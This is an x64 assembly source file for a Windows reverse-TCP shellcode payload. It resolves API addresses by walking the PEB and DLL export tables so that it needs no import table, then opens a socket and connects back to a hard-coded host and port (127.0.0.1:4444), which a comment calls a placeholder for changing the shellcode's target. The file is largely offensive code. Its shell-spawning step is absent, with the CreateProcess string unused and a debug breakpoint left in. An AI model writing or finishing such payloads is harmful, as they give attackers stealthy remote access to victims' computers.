;reverse_tcp.asm
;License: MIT (http://www.opensource.org/licenses/mit-license.php)
;compile ml64 /link /entry:main reverse_tcp.asm

.code
 
;note: ExitProcess is forwarded
main proc

    sub rsp, 28h            ;reserve stack space for called functions
    and rsp, 0fffffffffffffff0h     ;make sure stack 16-byte aligned 
    
    lea rdx, loadlib_func
    lea rcx, kernel32_dll
    call lookup_api         ;get address of LoadLibraryA
    mov r15, rax            ;save for later use with forwarded exports
    
    call startup
    cmp rax, 0h             ; check result
    jne exit                ; failed
    
    call socket             ; setup socket
    cmp rax, -1h            ; check result 
    je  cleanup             ; failed INVALID_SOCKET
    
    call connect            ; connect socket
    cmp rax, 0h             ; check result
    jne checkerr            ; failed
    
cleanup:
    
    lea rcx, ws2_32_dll
    call r15                ;load ws2_32.dll

    lea rdx, wsa_cleanup_func
    lea rcx, ws2_32_dll
    call lookup_api         ; get address of WSACleanup
    
    call rax                ; WSACleanup
    
exit:

    lea rdx, exitproc_func
    lea rcx, kernel32_dll
    call lookup_api         ;get address of ExitProcess
 
    xor rcx, rcx            ;exit code zero
    call rax                ;exit    
    
    add rsp, 28h
    ret
    
    
checkerr:
    
    lea rcx, ws2_32_dll
    call r15                ;load ws2_32.dll

    lea rdx, wsa_getlasterr_func
    lea rcx, ws2_32_dll
    call lookup_api         ; get address of WSAGetLastError
    
    int 3
    call rax                ; WSAGetLastError
    
    jmp cleanup

main endp

startup proc

    push rbp
    mov rbp, rsp

    sub rsp, 1c0h                   ; allocate space (local 198h for WSADATA + 20h shadow space)
    and rsp, 0fffffffffffffff0h     ;make sure stack 16-byte aligned 
    
    
    lea rcx, ws2_32_dll
    call r15                ;load ws2_32.dll
    
    lea rdx, wsa_startup_func
    lea rcx, ws2_32_dll
    call lookup_api         ; get address of WSAStartup

    
    lea rdx, [rbp-30h]          ; lpWSAData skip shadow & return addr
    mov rcx, 2d             ; wVersionRequired
    call rax                ; WSAStartup
    
    add rsp, 1c0h           ; deallocate stack space

    leave
    ret

startup endp

socket proc

    push rbp
    mov rbp, rsp
    
    ; allocate space
    sub rsp, 30h            ; allocate space (20h shadow + GROUP 4h + dwFlags 4h + padding 8h)
    and rsp, 0fffffffffffffff0h     ;make sure stack 16-byte aligned 
    
    lea rcx, ws2_32_dll
    call r15                ;load ws2_32.dll
        
    lea rdx, wsa_socketa_func
    lea rcx, ws2_32_dll
    call lookup_api         ; get address of WSASocketA
        
    xor rbx, rbx
    mov [rsp+24h], rbx       ; dwFlags
    mov [rsp+20h], rbx       ; group 
    
    mov r9, 0h              ; lpProtocolInfo
    mov r8, 6h              ; protocol
    mov rdx, 1h             ; type
    mov rcx, 2h             ; af
    
    call rax                ; WSASocket
        
    add rsp, 30h           ; deallocate stack space
    
    leave
    ret

socket endp

connect proc

    push rbp
    mov rbp, rsp
    
    ; allocate space
    sub rsp, 3ah                   ; allocate space (20h shadow + sockaddr 10h + socketfd 4h + 6h padding)
    and rsp, 0fffffffffffffff0h    ; make sure stack 16-byte aligned
    
    mov [rbp-12h], eax              ; save socket fd
    
    lea rcx, ws2_32_dll
    call r15                ;load ws2_32.dll
        
    lea rdx, wsa_connect_func
    lea rcx, ws2_32_dll
    call lookup_api         ; get address of WSAConnect
            
    xor r8, r8
    add r8w, 2h
    mov [rbp-0ch], r8w       ; family type
            
    mov r8w, [port]         ; port
    mov [rbp-0ah], r8w
    
    mov r8d, [host_addr]    ; host addr
    mov [rbp-8h], r8d
    
    mov r8, 10h             ; namelen 16 bytes
    lea rdx, [rbp-0ch]      ; sockaddr
    mov ecx, [rbp-12h]      ; socket fd
    
    call rax                ; connect
    
    add rsp, 3ah           ; deallocate stack space
    
    leave
    ret

connect endp

; required dlls
kernel32_dll        db  'KERNEL32.DLL', 0
ws2_32_dll          db  'WS2_32.DLL', 0

; required functions
loadlib_func        db  'LoadLibraryA', 0
wsa_startup_func    db  'WSAStartup', 0
wsa_cleanup_func    db  'WSACleanup', 0
wsa_socketa_func    db  'WSASocketA', 0
wsa_connect_func    db  'connect', 0
wsa_getlasterr_func db  'WSAGetLastError', 0
create_process_func db  'CreateProcess', 0
exitproc_func       db  'ExitProcess', 0
;exitthread_func    db  'ExitThread', 0

; initialized

;host_addr           dd  ffffffffh      ; 255.255.255.255 placeholder so shellcode can be dynamically changed
host_addr           dd  0100007fh      ; 127.0.0.1
port                dw  5c11h          ; 4444d

 
;look up address of function from DLL export table
;rcx=DLL name string, rdx=function name string
;DLL name must be in uppercase
;r15=address of LoadLibraryA (optional, needed if export is forwarded)
;returns address in rax
;returns 0 if DLL not loaded or exported function not found in DLL
lookup_api  proc
    sub rsp, 28h            ;set up stack frame in case we call loadlibrary
 
start:
    mov r8, gs:[60h]        ;peb
    mov r8, [r8+18h]        ;peb loader data
    lea r12, [r8+10h]       ;InLoadOrderModuleList (list head) - save for later
    mov r8, [r12]           ;follow _LIST_ENTRY->Flink to first item in list
    cld
 
for_each_dll:               ;r8 points to current _ldr_data_table_entry
 
    mov rdi, [r8+60h]       ;UNICODE_STRING at 58h, actual string buffer at 60h
    mov rsi, rcx            ;pointer to dll we're looking for
 
compare_dll:
    lodsb                   ;load character of our dll name string
    test al, al             ;check for null terminator
    jz found_dll            ;if at the end of our string and all matched so far, found it
 
    mov ah, [rdi]           ;get character of current dll
    cmp ah, 61h             ;lowercase 'a'
    jl uppercase
    sub ah, 20h             ;convert to uppercase
 
uppercase:
    cmp ah, al
    jne wrong_dll           ;found a character mismatch - try next dll
 
    inc rdi                 ;skip to next unicode character
    inc rdi
    jmp compare_dll         ;continue string comparison
 
wrong_dll:
    mov r8, [r8]            ;move to next _list_entry (following Flink pointer)
    cmp r8, r12             ;see if we're back at the list head (circular list)
    jne for_each_dll
 
    xor rax, rax            ;DLL not found
    jmp done
 
found_dll:
    mov rbx, [r8+30h]       ;get dll base addr - points to DOS "MZ" header
 
    mov r9d, [rbx+3ch]      ;get DOS header e_lfanew field for offset to "PE" header
    add r9, rbx             ;add to base - now r9 points to _image_nt_headers64
    add r9, 88h             ;18h to optional header + 70h to data directories
                            ;r9 now points to _image_data_directory[0] array entry
                            ;which is the export directory
 
    mov r13d, [r9]          ;get virtual address of export directory
    test r13, r13           ;if zero, module does not have export table
    jnz has_exports
 
    xor rax, rax            ;no exports - function will not be found in dll
    jmp done
 
has_exports:
    lea r8, [rbx+r13]       ;add dll base to get actual memory address
                            ;r8 points to _image_export_directory structure (see winnt.h)
 
    mov r14d, [r9+4]        ;get size of export directory
    add r14, r13            ;add base rva of export directory
                            ;r13 and r14 now contain range of export directory
                            ;will be used later to check if export is forwarded
 
    mov ecx, [r8+18h]       ;NumberOfNames
    mov r10d, [r8+20h]      ;AddressOfNames (array of RVAs)
    add r10, rbx            ;add dll base
 
    dec ecx                 ;point to last element in array (searching backwards)
for_each_func:
    lea r9, [r10 + 4*rcx]   ;get current index in names array
 
    mov edi, [r9]           ;get RVA of name
    add rdi, rbx            ;add base
    mov rsi, rdx            ;pointer to function we're looking for
 
compare_func:
    cmpsb
    jne wrong_func          ;function name doesn't match
 
    mov al, [rsi]           ;current character of our function
    test al, al             ;check for null terminator
    jz found_func           ;if at the end of our string and all matched so far, found it
 
    jmp compare_func        ;continue string comparison
 
wrong_func:
    loop for_each_func      ;try next function in array
 
    xor rax, rax            ;function not found in export table
    jmp done
 
found_func:                 ;ecx is array index where function name found
 
                            ;r8 points to _image_export_directory structure
    mov r9d, [r8+24h]       ;AddressOfNameOrdinals (rva)
    add r9, rbx             ;add dll base address
    mov cx, [r9+2*rcx]      ;get ordinal value from array of words
 
    mov r9d, [r8+1ch]       ;AddressOfFunctions (rva)
    add r9, rbx             ;add dll base address
    mov eax, [r9+rcx*4]     ;Get RVA of function using index
 
    cmp rax, r13            ;see if func rva falls within range of export dir
    jl not_forwarded
    cmp rax, r14            ;if r13 <= func < r14 then forwarded
    jae not_forwarded
 
    ;forwarded function address points to a string of the form <DLL name>.<function>
    ;note: dll name will be in uppercase
    ;extract the DLL name and add ".DLL"
 
    lea rsi, [rax+rbx]      ;add base address to rva to get forwarded function name
    lea rdi, [rsp+30h]      ;using register storage space on stack as a work area
    mov r12, rdi            ;save pointer to beginning of string
 
copy_dll_name:
    movsb
    cmp byte ptr [rsi], 2eh     ;check for '.' (period) character
    jne copy_dll_name
 
    movsb                               ;also copy period
    mov dword ptr [rdi], 004c4c44h      ;add "DLL" extension and null terminator
 
    mov rcx, r12            ;r12 points to "<DLL name>.DLL" string on stack
    call r15                ;call LoadLibraryA with target dll
 
    mov rcx, r12            ;target dll name
    mov rdx, rsi            ;target function name
    jmp start               ;start over with new parameters
 
not_forwarded:
    add rax, rbx            ;add base addr to rva to get function address
done:
    add rsp, 28h            ;clean up stack
    ret
 
lookup_api endp
 
end